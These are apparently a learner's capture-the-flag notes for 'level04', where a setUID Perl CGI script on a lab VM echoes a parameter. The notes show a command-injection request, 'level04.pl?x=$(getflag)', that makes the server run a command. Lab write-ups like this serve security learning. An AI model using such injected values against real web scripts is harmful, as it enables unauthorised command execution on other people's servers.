#The file in our home is a perl file setUID of flag04

cat level04.pl

#After a quick read, we observe that the file is a web page running on port 4747
# Lets get on a web browser and reach my vm adress on port 4747

http://10.11.200.127:4747/

#It is a web server so i can reach the script through it

http://10.11.200.127:4747/level04.pl

#We can see that it print the content of a variable x
# to exploit that breach, we must set x through a post request and do a little trick to print the output of getflag instead

http://10.11.200.127:4747/level04.pl?method=post&x=$(getflag)

#It Works !
